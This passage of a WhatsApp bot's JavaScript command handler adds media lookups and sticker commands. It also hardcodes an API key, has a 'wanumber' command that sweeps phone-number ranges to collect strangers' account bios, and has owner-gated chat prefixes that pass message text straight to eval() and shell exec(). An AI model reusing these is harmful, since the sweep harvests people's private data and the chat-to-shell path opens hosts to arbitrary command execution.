        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest(text);
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] // Hapus semua tombol
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `${text}\n> Batas 10 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
case 'ringtone': {
		if (!text) return replynano(`Example : ${prefix + command} black rover`)
        let { ringtone } = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		NanoBotz.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
	case 'genshin':
if (!text) return replynano(`Which genshin are you lookin for?`)
try {
const genshin = require("genshin-api")
a = text.toLowerCase();
const anime = await genshin.Characters(text)
let txt = ""
txt += `🎀 *Nama:* ${anime.name}\n`
txt += `🎖️ *Judul:* ${anime.title}\n`
txt += `💠 *Versi:* ${anime.vision}\n`
txt += `🏹 *Weapon:* ${anime.weapon}\n`
txt += `💮 *Gender:* ${anime.gender}\n`
txt += `🌏 *Nation:* ${anime.nation}\n`
txt += `🪷 *Affiliation:* ${anime.affiliation}\n`
txt += `🌟 *Rarity:* ${anime.rarity}\n`
txt += `❄️ *Constellation:* ${anime.constellation}\n`
txt += `📖 *Description:* ${anime.description}\n`
txt += `🌐 *Url:* https://genshin-impact.fandom.com/wiki/${a}\n`
urll = `https://api.genshin.dev/characters/${a}/portrait`
await NanoBotz.sendMessage(m.chat,{image:{url:urll}, caption:txt},{quoted:m})
} catch (err) {
console.log(err)
return replynano('Error')
}
break
case 'patrick':
case 'patricksticker': {
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/patrick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await NanoBotz.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case 'dogesticker':
case 'dogestick':
	case 'doge':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/doge')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await NanoBotz.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case 'lovesticker':
case 'lovestick' :{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/love')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await NanoBotz.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await NanoBotz.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
	case 'anime': {
if (!text) return replynano(`Anime Apa Yang Anda Cari?`)
const malScraper = require('mal-scraper')
reply(mess.wait)
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return replynano(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
await NanoBotz.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
}
break
case 'animevideo': 
case 'amv': {
    if (!text) return reply('Enter the number\nSample: .amv 1')
    reply(mess.wait)
async function animeVideo() {
    const url = 'https://shortstatusvideos.com/anime-video-status-download/'; // Ganti dengan URL yang sesuai
    const response = await fetch(url);
    const html = await response.text();
    const $ = cheerio.load(html);
    const videos = [];
    $('a.mks_button.mks_button_small.squared').each((index, element) => {
        const href = $(element).attr('href');
        const title = $(element).closest('p').prevAll('p').find('strong').text();
        videos.push({
            title,
            source: href
        });
    });

    const randomIndex = Math.floor(Math.random() * videos.length);
    const randomVideo = videos[randomIndex];

    return randomVideo;
}

async function animeVideo2() {
    const url = 'https://mobstatus.com/anime-whatsapp-status-video/'; // Ganti dengan URL yang sesuai
    const response = await fetch(url);
    const html = await response.text();
    const $ = cheerio.load(html);

    const videos = [];

    const title = $('strong').text();

    $('a.mb-button.mb-style-glass.mb-size-tiny.mb-corners-pill.mb-text-style-heavy').each((index, element) => {
        const href = $(element).attr('href');
        videos.push({
            title,
            source: href
        });
    });

    const randomIndex = Math.floor(Math.random() * videos.length);
    const randomVideo = videos[randomIndex];

    return randomVideo;
}
    if (text == '1') {
        try {
            let resl = await animeVideo()
            let cap = `Here's the video`
            await NanoBotz.sendFile(m.chat, resl.source, "", cap, m)
        } catch (e) {
            await reply(eror)
        }
    }
    if (text == '2') {
        try {
            let resl = await animeVideo2()
            let cap = `Here's the video`
            await NanoBotz.sendFile(m.chat, resl.source, "", cap, m)
        } catch (e) {
            await reply(eror)
        }
    }
}
break
case 'imdb':
if (!text) return replynano(`_Name a Series or movie`)
reply(mess.wait)
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "🚹imdbVotes  : " + fids.data.imdbVotes + ""
           NanoBotz.sendMessage(m.chat, {
image: {
url: fids.data.Poster,
},
caption: imdbt,
            }, {
quoted: m,
            })
            break

           case 'wanumber': case 'searchno': case 'searchnumber':{
           	if (!text) return replynano(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        replynano(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
random21 = `${status1}`
            } else if (random_length == 2) {
random21 = `${status1}${status2}`
            } else if (random_length == 3) {
random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await NanoBotz.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
try {
var anu1 = await NanoBotz.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
            } catch {
nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replynano(`${text66}${nobio}${nowhatsapp}`)
        }
break
default:
if (budy.startsWith('<')) {
if (!DanzTheCreator) return
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}

if (budy.startsWith('$')) {
                    if (!DanzTheCreator) return reply(mess.only.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replynano(err)
                        if (stdout) return replynano(stdout)
                    })
                }


if (budy.startsWith('vv')) {
if (!DanzTheCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!DanzTheCreator) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
NanoBotz.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
}
}

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})
